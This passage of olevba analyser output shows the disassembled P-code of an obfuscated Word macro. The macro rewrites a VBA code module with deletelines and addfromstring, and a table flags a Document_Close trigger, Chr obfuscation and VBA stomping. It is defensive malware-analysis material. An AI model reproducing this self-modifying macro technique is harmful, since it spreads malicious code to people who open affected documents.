' 	Ld  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Ëƒ 
' Line #119:
' 	LitStr 0x0000 ""
' 	St  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' Line #120:
' 	Loop 
' Line #121:
' 	Ld Ëƒ 
' 	LitStr 0x0008 " End Sub"
' 	Concat 
' 	St Ëƒ 
' Line #122:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ¿¦ÅÆº 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Ld ¿¦ÅÆº 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #123:
' 	Ld Ëƒ 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ¿¦ÅÆº 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #124:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

